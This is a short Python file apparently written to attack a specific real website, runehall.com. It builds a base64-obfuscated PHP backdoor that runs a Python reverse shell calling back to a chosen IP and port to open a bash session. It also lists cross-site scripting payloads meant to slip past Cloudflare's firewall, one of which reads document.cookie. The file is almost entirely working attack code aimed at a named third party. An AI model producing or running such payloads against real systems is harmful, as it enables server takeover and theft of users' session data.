import base64

class RuneHallPayloads:
    """
    Customized payloads for runehall.com infrastructure.
    Focuses on Cloudflare evasion and PHP environment testing.
    """
    def __init__(self):
        self.domain = "runehall.com"
        
    def get_php_backdoor(self, callback_ip, callback_port):
        """
        Generates a stealthy PHP reverse shell payload.
        """
        # A stealthy, one-liner PHP reverse shell obfuscated
        raw_shell = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{callback_ip}\",{callback_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        b64_shell = base64.b64encode(raw_shell.encode()).decode()
        
        php_payload = f"<?php system(base64_decode('{b64_shell}')); ?>"
        return php_payload

    def get_cloudflare_xss(self):
        """
        Aggressive XSS payloads designed to bypass Cloudflare WAF.
        """
        return [
            # Using SVG and different event handlers
            '<svg/onload="eval(atob(\'YWxlcnQoJ05pZ2h0RnVyeSBYU1MnKQ==\'))">',
            # Using HTML5 features
            '<details open ontoggle="confirm(document.domain)">',
            # Obfuscated script tags
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # Using MathML
            '<math><mtext><option><fake><script>alert(document.cookie)</script>'
        ]

if __name__ == "__main__":
    rh = RuneHallPayloads()
    print("--- RuneHall PHP Backdoor ---")
    print(rh.get_php_backdoor("127.0.0.1", 4444))
    print("\n--- RuneHall Cloudflare XSS ---")
    for p in rh.get_cloudflare_xss():
        print(p)
